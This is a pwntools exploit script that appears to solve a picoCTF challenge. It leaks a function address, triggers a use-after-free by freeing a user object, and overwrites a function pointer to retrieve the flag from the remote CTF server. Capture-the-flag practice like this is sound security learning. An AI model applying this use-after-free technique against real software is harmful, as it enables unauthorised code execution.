#!/usr/bin/python
from pwn import *

io = remote("mercury.picoctf.net", 58574)
# context.log_level = "DEBUG"

# Leaking hahaexploitgobrrr address
log.progress("Stage 1: leaking hahaexploitgobrrr address")

io.sendlineafter(b"Welcome to my stream!",b"s")
addr = io.recvuntil(b"Thanks for subsribing! I really recommend becoming a premium member!")
addr_lines = addr.split(b"\n")

for line in addr_lines:
    if b"OOP!" in line:
        addr = line[19:]
        break

addr = addr.strip().decode()
addr = int(addr, 16)
addr = p32(addr)

log.success(f"&hahaexploitgobrrr = 0x{u32(addr):08x}")

# Freeing user obj
log.progress("Stage 2: freeing user obj")

io.sendlineafter(b"Welcome to my stream!",b"i")
io.sendlineafter(b"You're leaving already(Y/N)?",b"y")

# Overwriting the whatToDo ptr
log.progress("Stage 3: Overwriting the whatToDo ptr")

io.sendlineafter(b"Welcome to my stream!",b"l")
io.recv() # Timing purposes
io.send_raw(addr) # Send payload
io.recv() # Timing purposes

flag_data = io.recv()

log.success("Done!")

# Fetching the Flag
data_str = flag_data.decode('utf-8')  # Decode the byte string to a normal string
lines = data_str.split('\n')  # Split the lines

flag = None  # Initialize the flag
for line in lines:  # Search between lines
    if '{' in line and '}' in line:  # If the line contains both '{' and '}'
        flag = line.strip()
        break  # Stop after finding the first flag

if flag:  # Ensure a flag was found
    log.success(f"Flag: {flag}")
else:
    log.failure("No flag found.\nre-run the exploit.")
